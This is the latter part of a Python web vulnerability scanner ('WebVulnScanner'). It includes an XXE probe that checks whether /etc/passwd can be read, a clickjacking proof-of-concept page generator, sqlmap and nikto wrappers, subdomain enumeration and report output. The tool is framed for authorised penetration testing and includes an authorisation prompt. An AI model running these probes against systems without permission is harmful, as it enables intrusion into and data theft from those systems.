            target = self.url.rstrip("/")+path
            r = self.sess.post(target, data=xxe_payload,
                               headers={"Content-Type":"application/xml"}, timeout=5)
            if r and "root:" in (r.text or ""):
                self.report.add(Vuln(
                    name="XML External Entity Injection (XXE)",
                    severity="Critical",
                    desc="Application parses XML with external entities enabled, "
                         "allowing /etc/passwd to be read.",
                    component=target, evidence=r.text[:200],
                    fix="Disable external entity processing in XML parser. "
                        "Use defusedxml (Python) or equivalent.",
                    refs=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing","CWE-611"]
                ))
                return

    # ── Clickjacking ──────────────────────────────────────────────────────────
    def test_clickjacking(self, output_dir: Path):
        r = self.sess.get(self.url)
        if not r: return
        hl = {k.lower():v for k,v in r.headers.items()}
        xfo = hl.get("x-frame-options","")
        csp = hl.get("content-security-policy","")
        if not xfo and "frame-ancestors" not in csp:
            # Already reported via headers module; generate PoC
            poc_path = output_dir / "clickjacking_poc.html"
            poc_html = f"""<!DOCTYPE html>
<html><head><title>Clickjacking PoC</title></head>
<body style="background:#222;color:#fff;font-family:sans-serif;padding:20px">
<h2>⚠ Clickjacking Proof of Concept</h2>
<p>Target: <strong>{html_module.escape(self.url)}</strong></p>
<p>The target page can be embedded in an iframe — this enables clickjacking attacks.</p>
<div style="position:relative;width:800px;height:600px">
  <iframe src="{html_module.escape(self.url)}" style="opacity:0.5;width:800px;height:600px;
    position:absolute;top:0;left:0;z-index:2" frameborder="0"></iframe>
  <div style="position:absolute;top:200px;left:300px;z-index:1;
    background:red;padding:20px;font-size:20px">CLICK HERE</div>
</div>
</body></html>"""
            try:
                poc_path.write_text(poc_html, encoding="utf-8")
                self.report.add(Vuln(
                    name="Clickjacking — PoC page generated",
                    severity="Medium",
                    desc="Target can be embedded in an iframe. PoC saved to clickjacking_poc.html.",
                    component=self.url,
                    fix="Add X-Frame-Options: DENY or CSP frame-ancestors 'none'.",
                    refs=["https://owasp.org/www-community/attacks/Clickjacking"]
                ))
            except Exception:
                pass

    # ── Nikto ─────────────────────────────────────────────────────────────────
    def run_nikto(self):
        if not shutil.which("nikto"): return
        _status("Running Nikto")
        try:
            out = subprocess.run(
                ["nikto","-h",self.url,"-nointeractive","-Format","txt"],
                capture_output=True, text=True, timeout=300
            ).stdout
            for line in out.splitlines():
                if line.startswith("+") and len(line) > 10:
                    cves = re.findall(r"CVE-\d{4}-\d+", line)
                    sev  = "High" if cves else "Medium"
                    self.report.add(Vuln(
                        name=f"Nikto: {line[2:80]}",
                        severity=sev, desc=line.strip(),
                        component=self.url,
                        fix="Review Nikto finding and apply vendor patches.",
                        refs=["https://cirt.net/Nikto2"]+cves,
                        cves=cves
                    ))
        except subprocess.TimeoutExpired:
            self.report.err("Nikto timed out")
        except Exception as e:
            self.report.err(f"Nikto: {e}")

    # ── sqlmap ────────────────────────────────────────────────────────────────
    def run_sqlmap(self):
        if not shutil.which("sqlmap"): return
        if "?" not in self.url: return
        _status("Running sqlmap")
        try:
            out = subprocess.run(
                ["sqlmap","-u",self.url,"--batch","--level=1","--risk=1",
                 "--output-dir=/tmp/sqlmap_out","--forms","--crawl=2"],
                capture_output=True, text=True, timeout=300
            ).stdout
            if "injectable" in out.lower():
                self.report.add(Vuln(
                    name="SQL Injection confirmed by sqlmap",
                    severity="Critical",
                    desc="sqlmap confirmed injectable parameters.",
                    component=self.url, evidence=out[:500],
                    fix="Use prepared statements for all database queries.",
                    refs=["https://sqlmap.org/","CWE-89"]
                ))
        except subprocess.TimeoutExpired:
            self.report.err("sqlmap timed out")
        except Exception as e:
            self.report.err(f"sqlmap: {e}")

    def run_all(self, output_dir: Path):
        self.test_xss()
        self.test_sqli_error()
        self.test_sqli_time()
        self.test_ssti()
        self.test_traversal()
        self.test_open_redirect()
        self.test_csrf()
        self.test_xxe()
        self.test_clickjacking(output_dir)
        self.run_nikto()
        self.run_sqlmap()


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: SUBDOMAIN ENUMERATION
# ══════════════════════════════════════════════════════════════════════════════

class SubdomainEnum:
    def __init__(self, url, report: Report):
        self.url    = url
        self.report = report
        self.base   = urlparse(url).hostname or ""
        # Strip www prefix
        if self.base.startswith("www."):
            self.base = self.base[4:]

    def run(self) -> List[str]:
        _status("Subdomain enumeration (DNS)")
        found = []
        def probe(sub):
            fqdn = f"{sub}.{self.base}"
            try:
                ip = socket.gethostbyname(fqdn)
                return (fqdn, ip)
            except Exception:
                return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS*2) as ex:
            results = list(ex.map(probe, SUBDOMAINS))

        for res in results:
            if not res: continue
            fqdn, ip = res
            found.append(fqdn)
            self.report.subdomains.append(fqdn)
            self.report.add(Vuln(
                name=f"Subdomain discovered: {fqdn}",
                severity="Info",
                desc=f"Active subdomain {fqdn} resolves to {ip}. Expand scope if authorised.",
                component=fqdn, evidence=f"IP: {ip}",
                fix="Ensure all subdomains are in scope and properly secured.",
            ))
        return found


# ══════════════════════════════════════════════════════════════════════════════
# REPORT GENERATOR
# ══════════════════════════════════════════════════════════════════════════════

class ReportGen:
    def __init__(self, r: Report):
        self.r = r

    def _banner(self):
        print(f"""
{C.CYN}{C.B}
 ██╗    ██╗██╗   ██╗██╗     ███╗   ██╗███████╗ ██████╗ █████╗ ███╗   ██╗
 ██║    ██║██║   ██║██║     ████╗  ██║██╔════╝██╔════╝██╔══██╗████╗  ██║
 ██║ █╗ ██║██║   ██║██║     ██╔██╗ ██║███████╗██║     ███████║██╔██╗ ██║
 ██║███╗██║██║   ██║██║     ██║╚██╗██║╚════██║██║     ██╔══██║██║╚██╗██║
 ╚███╔███╔╝╚██████╔╝███████╗██║ ╚████║███████║╚██████╗██║  ██║██║ ╚████║
  ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
{C.R}{C.B}                 WebVulnScanner v{VERSION} — Professional Edition
                 For authorised penetration testing only{C.R}
  ┌───────────────────────────────────────────────────────────────────┐
  │  ⚠  LEGAL NOTICE: AUTHORISED USE ONLY                            │
  │  Scanning without written permission violates the CFAA, UK CMA,  │
  │  and equivalent laws worldwide. The authors bear no liability.   │
  └───────────────────────────────────────────────────────────────────┘""")

    def print_terminal(self):
        r     = self.r
        stats = r.stats()

        print(f"\n{C.B}{'═'*70}{C.R}")
        print(f"{C.B}  SCAN REPORT{C.R}")
        print(f"{'═'*70}")
        print(f"  {C.B}Target   :{C.R} {r.url}")
        print(f"  {C.B}IP       :{C.R} {r.ip}")
        print(f"  {C.B}Date     :{C.R} {r.start.strftime('%Y-%m-%d %H:%M:%S')} UTC")
        print(f"  {C.B}Duration :{C.R} {r.duration()}")
        if r.cms:  print(f"  {C.B}CMS      :{C.R} {r.cms}")
        if r.waf:  print(f"  {C.B}WAF/CDN  :{C.R} {r.waf}")
        if r.info.get("server"):  print(f"  {C.B}Server   :{C.R} {r.info['server']}")
        if r.info.get("ssl_proto"): print(f"  {C.B}TLS      :{C.R} {r.info['ssl_proto']}")
        if r.subdomains: print(f"  {C.B}Subdomains:{C.R} {len(r.subdomains)} found")

        if r.ports:
            print(f"\n{C.B}  OPEN PORTS{C.R}")
            print(f"  {'─'*60}")
            for p in sorted(r.ports, key=lambda x: x["port"]):
                ver = f" ({p['version']})" if p.get("version") else ""
                print(f"  {C.GRN}  ●{C.R}  {p['port']}/tcp   {p['service']}{ver}")

        print(f"\n{C.B}  VULNERABILITY SUMMARY{C.R}")
        print(f"  {'─'*60}")
        total = sum(stats.values())
        for sev in ["Critical","High","Medium","Low","Info"]:
            cnt = stats.get(sev,0)
            col = C.sev(sev)
            bar = "█" * min(cnt,40)
            print(f"  {col}{sev:10}{C.R}  {bar} {cnt}")
        print(f"  {'─'*60}")
        print(f"  {'TOTAL':10}  {total}")

        print(f"\n{C.B}  FINDINGS (sorted by severity){C.R}")
        print(f"  {'─'*70}")
        for i, v in enumerate(r.sorted_vulns(), 1):
            col = C.sev(v.severity)
            print(f"\n  {C.B}[{i:03d}] {v.name}{C.R}")
            print(f"  {col}Severity : {v.severity}{C.R}")
            if v.component:  print(f"  Component: {v.component}")
            print(f"  Desc     : {v.desc}")
            if v.evidence:   print(f"  Evidence : {v.evidence[:100]}")
            if v.fix:        print(f"  Fix      : {v.fix}")
            if v.cves:       print(f"  CVEs     : {', '.join(v.cves)}")
            for ref in v.refs[:2]:
                print(f"  Ref      : {ref}")

        if r.errors:
            print(f"\n{C.YLW}  ERRORS / WARNINGS{C.R}")
            for e in r.errors:
                print(f"  {C.YLW}⚠{C.R} {e}")

        print(f"\n{'═'*70}\n")

    def save_json(self, path):
        data = {
            "meta":{
                "tool":f"WebVulnScanner v{VERSION}","target":self.r.url,
                "ip":self.r.ip,"start":self.r.start.isoformat(),
                "end":self.r.end.isoformat() if self.r.end else None,
                "duration":self.r.duration(),"cms":self.r.cms,
                "waf":self.r.waf,"info":self.r.info,
                "subdomains":self.r.subdomains,
            },
            "stats":self.r.stats(),
            "open_ports":self.r.ports,
            "vulnerabilities":[v.to_dict() for v in self.r.sorted_vulns()],
            "errors":self.r.errors,
        }
        with open(path,"w",encoding="utf-8") as f:
            json.dump(data,f,indent=2,default=str)
        print(f"{C.GRN}[+]{C.R} JSON  → {path}")

    def save_html(self, path):
        stats   = self.r.stats()
        vulns   = self.r.sorted_vulns()
        col_map = {"Critical":"#e74c3c","High":"#e67e22",
                   "Medium":"#f39c12","Low":"#3498db","Info":"#7f8c8d"}

        rows = ""
        for i,v in enumerate(vulns,1):
            c    = col_map.get(v.severity,"#ccc")
            refs = " ".join(
                f'<a href="{r}" target="_blank" style="color:#58a6ff">[{j+1}]</a>'
                for j,r in enumerate(v.refs[:3])
            )
            rows += f"""<tr>
<td style="text-align:center">{i}</td>
<td><strong>{html_module.escape(v.name)}</strong></td>
<td><span style="color:{c};font-weight:bold">{v.severity}</span></td>
<td style="font-size:11px">{html_module.escape(v.component)}</td>
<td>{html_module.escape(v.desc)}</td>
<td style="font-size:11px">{html_module.escape(v.fix)}</td>
<td>{refs}</td>
</tr>"""

        bars = "".join(
            f'<div style="display:flex;align-items:center;margin:4px 0">'
            f'<span style="width:75px;font-size:12px;color:{col_map[s]}">{s}</span>'
            f'<div style="background:{col_map[s]};height:20px;width:{min(stats.get(s,0)*8,250)}px;'
            f'border-radius:3px;display:flex;align-items:center;padding:0 6px;'
            f'font-size:11px;color:#fff;min-width:24px">{stats.get(s,0)}</div></div>'
            for s in ["Critical","High","Medium","Low","Info"]
        )

        ports_html = ""
        if self.r.ports:
            rows_p = "".join(
                f"<tr><td>{p['port']}/tcp</td><td>{p['service']}</td>"
                f"<td>{p.get('version','')}</td></tr>"
                for p in sorted(self.r.ports,key=lambda x:x["port"])
            )
            ports_html = f"""<h2>Open Ports</h2>
<table><tr><th>Port</th><th>Service</th><th>Version</th></tr>{rows_p}</table>"""

        subs_html = ""
        if self.r.subdomains:
            subs_html = "<h2>Discovered Subdomains</h2><ul>" + \
                        "".join(f"<li>{s}</li>" for s in self.r.subdomains) + "</ul>"

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Vulnerability Report — {html_module.escape(self.r.url)}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'Segoe UI',Consolas,monospace;background:#0d1117;color:#c9d1d9;padding:24px}}
h1{{color:#58a6ff;font-size:26px;margin-bottom:8px}}
h2{{color:#79c0ff;font-size:17px;border-bottom:1px solid #30363d;
   padding-bottom:6px;margin:24px 0 10px}}
.meta{{background:#161b22;padding:16px;border-radius:8px;
      border:1px solid #30363d;margin-bottom:20px;line-height:1.8}}
.meta strong{{color:#e6edf3}}
table{{width:100%;border-collapse:collapse;font-size:13px;margin-top:6px}}
th{{background:#161b22;color:#8b949e;text-align:left;
   padding:8px 10px;border:1px solid #30363d}}
td{{padding:7px 10px;border:1px solid #21262d;vertical-align:top}}
tr:nth-child(even){{background:#0d1117}} tr:hover{{background:#1c2128}}
.badge{{padding:2px 8px;border-radius:4px;font-size:11px;font-weight:bold;white-space:nowrap}}
.Critical{{background:#5c1a1a;color:#e74c3c}} .High{{background:#5c3317;color:#e67e22}}
.Medium{{background:#5c4a17;color:#f1c40f}} .Low{{background:#17415c;color:#3498db}}
.Info{{background:#2d2d2d;color:#7f8c8d}}
a{{color:#58a6ff;text-decoration:none}} a:hover{{text-decoration:underline}}
footer{{margin-top:30px;color:#484f58;font-size:11px;text-align:center}}
</style>
</head>
<body>
<h1>🔍 WebVulnScanner — Security Report</h1>
<div class="meta">
<strong>Target:</strong> <a href="{html_module.escape(self.r.url)}" target="_blank">{html_module.escape(self.r.url)}</a> &nbsp;|&nbsp;
<strong>IP:</strong> {self.r.ip} &nbsp;|&nbsp;
<strong>Date:</strong> {self.r.start.strftime('%Y-%m-%d %H:%M:%S')} UTC &nbsp;|&nbsp;
<strong>Duration:</strong> {self.r.duration()}<br>
<strong>CMS:</strong> {self.r.cms or '—'} &nbsp;|&nbsp;
<strong>WAF/CDN:</strong> {self.r.waf or '—'} &nbsp;|&nbsp;
<strong>Server:</strong> {html_module.escape(self.r.info.get('server','—'))} &nbsp;|&nbsp;
<strong>TLS:</strong> {self.r.info.get('ssl_proto','—')} &nbsp;|&nbsp;
<strong>TLS days left:</strong> {self.r.info.get('ssl_days_left','—')}
</div>

<h2>Summary ({len(vulns)} findings)</h2>
{bars}

{ports_html}
{subs_html}

<h2>Findings</h2>
<table>
<tr><th>#</th><th>Vulnerability</th><th>Severity</th><th>Component</th>
    <th>Description</th><th>Remediation</th><th>Refs</th></tr>
{rows}
</table>

{'<h2>Errors</h2><ul>' + ''.join(f'<li>{html_module.escape(e)}</li>' for e in self.r.errors) + '</ul>' if self.r.errors else ''}

<footer>Generated by WebVulnScanner v{VERSION} — For authorised use only</footer>
</body></html>"""

        with open(path,"w",encoding="utf-8") as f:
            f.write(html)
        print(f"{C.GRN}[+]{C.R} HTML  → {path}")

    def save_txt(self, path):
        lines = [
            f"WebVulnScanner v{VERSION} — Scan Report",
            "="*65,
            f"Target   : {self.r.url}",
            f"IP       : {self.r.ip}",
            f"Date     : {self.r.start.strftime('%Y-%m-%d %H:%M:%S')} UTC",
            f"Duration : {self.r.duration()}",
            f"CMS      : {self.r.cms or 'N/A'}",
            f"WAF      : {self.r.waf or 'N/A'}",
            "",
            "SUMMARY","-"*40,
        ]
        for sev,cnt in self.r.stats().items():
            lines.append(f"  {sev:10} {cnt}")
        lines += ["","FINDINGS","-"*65]
        for i,v in enumerate(self.r.sorted_vulns(),1):
            lines += [
                f"\n[{i:03d}] {v.name}",
                f"  Severity  : {v.severity}",
                f"  Component : {v.component}",
                f"  Desc      : {v.desc}",
                f"  Fix       : {v.fix}",
            ]
            if v.cves: lines.append(f"  CVEs      : {', '.join(v.cves)}")
            for ref in v.refs[:2]: lines.append(f"  Ref       : {ref}")
        with open(path,"w",encoding="utf-8") as f:
            f.write("\n".join(lines))
        print(f"{C.GRN}[+]{C.R} TXT   → {path}")


# ══════════════════════════════════════════════════════════════════════════════
# PROGRESS / STATUS
# ══════════════════════════════════════════════════════════════════════════════
_CURRENT_STATUS = ""

def _status(msg: str):
    global _CURRENT_STATUS
    _CURRENT_STATUS = msg
    # Simple inline status — works on Windows without cursor tricks
    print(f"  {C.CYN}[*]{C.R} {msg}…")


# ══════════════════════════════════════════════════════════════════════════════
# MAIN SCANNER ORCHESTRATOR
# ══════════════════════════════════════════════════════════════════════════════

class Scanner:
    def __init__(self, url, output_dir=".", fast=False, stealth=False,
                 no_ports=False, no_subs=False, formats=None):
        self.url        = url
        self.output_dir = Path(output_dir)
        self.fast       = fast
        self.stealth    = stealth
        self.no_ports   = no_ports
        self.no_subs    = no_subs
        self.formats    = formats or []
        self.delay      = STEALTH_DELAY if stealth else DELAY

    def run(self) -> Report:
        # ── Resolve & reach ───────────────────────────────────────────────────
        try:
            self.url = Resolver.normalise(self.url)
        except ValueError as e:
            print(f"{C.RED}[!] {e}{C.R}"); sys.exit(1)

        print(f"\n{C.B}Target   :{C.R} {self.url}")

        try:
            ip = Resolver.resolve_ip(self.url)
        except socket.gaierror as e:
            print(f"{C.RED}[!] DNS failed: {e}{C.R}")
            print(f"{C.YLW}[~] Trying plain HTTP…{C.R}")
            # Retry with http
            http_url = "http://" + self.url.split("//",1)[-1]
            try:
                ip = Resolver.resolve_ip(http_url)
                self.url = http_url
            except Exception:
                print(f"{C.RED}[!] Cannot resolve hostname. Check URL and connectivity.{C.R}")
                sys.exit(1)

        print(f"{C.B}IP       :{C.R} {ip}")

        ok, msg = Resolver.check_reachable(self.url)
        if not ok:
            print(f"{C.RED}[!] Unreachable: {msg}{C.R}")
            # Don't exit — try to continue with whatever we can
            print(f"{C.YLW}[~] Proceeding with limited scan…{C.R}")

        print(f"{C.B}Status   :{C.R} {msg}\n")

        report = Report(self.url, ip)
        sess   = Session(delay=self.delay)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        print(f"{C.CYN}{C.B}  ━━━ Starting comprehensive scan ━━━{C.R}\n")

        def safe(fn, *a, **kw):
            try:
                fn(*a, **kw)
            except Exception as e:
                report.err(f"{fn.__name__ if hasattr(fn,'__name__') else str(fn)}: {e}")

        # Run each module — failures are isolated
        if not self.no_ports:
            safe(PortScanner(urlparse(self.url).hostname or ip, report, self.fast).scan)

        safe(WAFDetector(self.url, sess, report).detect)
        safe(Fingerprinter(self.url, sess, report).run)
        safe(HeadersAnalyser(self.url, sess, report).run)
        safe(SSLAnalyser(self.url, report).run)
        safe(CMSDetector(self.url, sess, report).run)
        safe(RobotsAnalyser(self.url, sess, report).run)
        safe(DirEnum(self.url, sess, report, self.fast).run)
        safe(JSScanner(self.url, sess, report).run)
        safe(CORSChecker(self.url, sess, report).run)
        safe(MethodTampering(self.url, sess, report).run)
        safe(HostHeaderInjection(self.url, sess, report).run)

        vt = VulnTester(self.url, sess, report, self.fast)
        safe(vt.run_all, self.output_dir)

        if not self.no_subs and not self.fast:
            safe(SubdomainEnum(self.url, report).run)

        report.done()
        return report


# ══════════════════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════════════════

def build_parser():
    p = argparse.ArgumentParser(
        prog="vuln_scanner.py",
        description="WebVulnScanner v3.0 — comprehensive web vulnerability assessment",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python vuln_scanner.py https://example.com
  python vuln_scanner.py https://example.com --format html json txt
  python vuln_scanner.py https://example.com --fast --no-ports
  python vuln_scanner.py https://example.com --stealth -o reports/
  python vuln_scanner.py https://example.com --no-subs --format html
"""
    )
    p.add_argument("url",      nargs="?",     help="Target URL")
    p.add_argument("-o","--output",default=".",help="Output directory (default: .)")
    p.add_argument("--format", nargs="+", choices=["json","html","txt"],
                   default=[], help="Auto-save report in these formats")
    p.add_argument("--fast",   action="store_true",
                   help="Fast mode: smaller wordlists, skip slow checks")
    p.add_argument("--stealth",action="store_true",
                   help="Stealth mode: longer delays, less aggressive")
    p.add_argument("--no-ports",action="store_true",help="Skip port scanning")
    p.add_argument("--no-subs", action="store_true",help="Skip subdomain enumeration")
    p.add_argument("--version", action="version", version=f"%(prog)s {VERSION}")
    return p


def main():
    if not REQUESTS_OK:
        print("ERROR: requests not installed.\nRun: pip install requests beautifulsoup4 lxml")
        sys.exit(1)

    parser = build_parser()
    args   = parser.parse_args()
    gen    = ReportGen(Report("",""))
    gen._banner()

    url = args.url or input(f"\n{C.B}  Enter target URL: {C.R}").strip()
    if not url:
        print(f"{C.RED}[!] No URL provided.{C.R}"); sys.exit(1)

    confirm = input(
        f"{C.YLW}  Do you have written authorisation to scan this target? [y/N]: {C.R}"
    ).strip().lower()
    if confirm != "y":
        print(f"{C.RED}[!] Authorisation required. Exiting.{C.R}"); sys.exit(0)

    scanner = Scanner(
        url        = url,
        output_dir = args.output,
        fast       = args.fast,
        stealth    = args.stealth,
        no_ports   = args.no_ports,
        no_subs    = args.no_subs,
        formats    = args.format,
    )
    report  = scanner.run()
    gen2    = ReportGen(report)
    gen2.print_terminal()

    # ── Auto-save ────────────────────────────────────────────────────────────
    ts   = report.start.strftime("%Y%m%d_%H%M%S")
    host = urlparse(report.url).hostname or "scan"
    stem = Path(args.output) / f"{host}_{ts}"

    if args.format:
        if "json" in args.format: gen2.save_json(str(stem)+".json")
        if "html" in args.format: gen2.save_html(str(stem)+".html")
        if "txt"  in args.format: gen2.save_txt (str(stem)+".txt")
    else:
        print(f"\n{C.B}Save report?{C.R}  1=JSON  2=HTML  3=TXT  4=All  5=Skip")
        ch = input("  Choice [1-5]: ").strip()
        if ch in ("1","4"): gen2.save_json(str(stem)+".json")
        if ch in ("2","4"): gen2.save_html(str(stem)+".html")
        if ch in ("3","4"): gen2.save_txt (str(stem)+".txt")

    stats = report.stats()
    sys.exit(1 if stats["Critical"] or stats["High"] else 0)


if __name__ == "__main__":
    main()
